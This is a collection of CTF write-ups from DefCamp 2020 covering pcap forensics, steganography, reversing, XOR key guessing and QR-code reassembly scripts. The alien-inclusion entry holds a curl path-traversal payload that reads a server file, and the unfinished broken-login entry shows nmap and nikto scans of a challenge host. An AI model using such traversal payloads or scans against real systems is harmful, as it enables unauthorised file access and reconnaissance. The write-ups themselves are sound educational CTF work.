# DefCamp CTF


# basic-coms

Filter wireshark for HTTP conversations and the flag is in the URL

# alien-inclusion

Taking into account the code that we see on the page, this would be the way to print the flag

```bash
curl -X POST -d 'start=../../../../../../var/www/html/flag.php' http://35.234.65.24:30627/?start=../../../../../../var/www/html/flag.php
```

# yopass-go

Disassemble using a dissassembler like Ghidra or Cutter. See the address '0x004c55f2', run the program and print this address where the flag string is.

# stug-reference

Extract with password 'stug'
```bash
steghide --extract -sf stug.jpg
```

# why-xor

Playing around with the program we notice that the flag has to start with "CTF{" and end with "}", meaning the first 4 letters have to be 'CTFc' and the last one has to be 'f', by trying out the key 'CTFctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctfctf', we notice that we get a valid flag.


# broken-login_IN_PROGRESS

```bash
kali@kali:~/Desktop/CTF-Write-ups/DCTF2020$ nmap 34.89.250.23 -p 32506 -sV -Pn -sC 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-05 20:08 UTC
Nmap scan report for 23.250.89.34.bc.googleusercontent.com (34.89.250.23)
Host is up (0.047s latency).

PORT      STATE SERVICE VERSION
32506/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.62 seconds
```

```bash
kali@kali:~/Desktop/CTF-Write-ups/DCTF2020$ nikto --host http://34.89.250.23:32506/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          34.89.250.23
+ Target Hostname:    34.89.250.23
+ Target Port:        32506
+ Start Time:         2020-12-05 20:11:37 (GMT0)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ 7917 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2020-12-05 20:18:33 (GMT0) (416 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

# qr-mania

In the pcap we search for PNG images, which we then extract using wireshark.
Once we have the images into a fonder we notice that each is a QRcode which contains a letter and that running strings on an image tells us the place of that letter in the flag as 'x/69'.


```bash
#!/bin/bash

find . -type f | grep png | sort |
while read -r line;
do
        echo "$line"
        # stegoveritas $line 1>/dev/null 2>/dev/null
        strings $line | grep /69
        zbarimg --quiet -S test-inverted $line
        stegoveritas -imageTransform 1>/dev/null $line
        zbarimg 2>/dev/null --quiet -S test-inverted results/* | uniq
        rm -r results
done
```
Most of the QRcodes aren't easily readable by 'zbarimg' and we need a few tricks.
This script takes the images and outputs something like what is below, but not exacly.
This is the output after I tinkered with it by hand.
It does not print anything for some, but that can be resolved as shown below.
Results
```
20/69
QR-Code:6
39/69
QR-Code:0
27/69
QR-Code:4
46/69
QR-Code:d
44/69
QR-Code:2
69/69P
QR-Code:}
56/69
QR-Code:7
45/69
QR-Code:5
54/69
QR-Code:d
65/69
QR-Code:1
57/69
QR-Code:7
63/69?:
QR-Code:1
26/69
QR-Code:c
30/69
QR-Code:b
58/69
QR-Code:2
8/69
QR-Code:e
52/69
QR-Code:2
62/69
QR-Code:2
48/69
QR-Code:3
3/69
QR-Code:F
41/69
QR-Code:6
15/69
QR-Code:f
51/69
QR-Code:a
61/69
QR-Code:f
40/69
QR-Code:f
47/69
QR-Code:a
37/69x
QR-Code:e
34/69
QR-Code:f
28/69
QR-Code:b
43/69
QR-Code:5
29/69
QR-Code:1
32/69
QR-Code:f
36/69
QR-Code:e
50/69
QR-Code:9
66/69
QR-Code:3
4/694
QR-Code:{
59/69
QR-Code:6
24/69
QR-Code:b
14/69
QR-Code:d
6/69
QR-Code:b
12/69
QR-Code:0
19/69
QR-Code:9
55/69
QR-Code:d
11/69
QR-Code:8
35/69
QR-Code:6
18/69
QR-Code:8
60/69
QR-Code:b
7/69
QR-Code:2
31/69
QR-Code:a
49/69
QR-Code:b
5/69
QR-Code:2
25/69
QR-Code:f
1/69
QR-Code:C
64/69
QR-Code:7
53/69
QR-Code:6
13/69
QR-Code:c
16/69
QR-Code:3
2/69
QR-Code:T
21/69
QR-Code:d
9/69
QR-Code:8
42/69
QR-Code:c
68/69
QR-Code:6
23/69
QR-Code:5
67/69
QR-Code:9
17/69
QR-Code:5
22/69r
QR-Code:7
33/69
QR-Code:f
38/69 
QR-Code:9
10/69
QR-Code:5
```

The script does not print anything for these images
```
59/69

11/69

21/69
```
That can be resolved manually by using stegoveritas and the phone's google lens :)


Extracts flag from the results of the command.
```py
def main():
    f = open("results", "r")
    nr = 0
    array = ['x']*100
    while True:
        nums = f.readline()
        code = f.readline()
        nums = nums.split('/')[0].strip()
        code = code.split(":")[1].strip()
        array[int(nums)] = code
        nr = nr + 1
        if nr == 69:
            break
    print("".join(array))
if __name__=="__main__":
    main()
```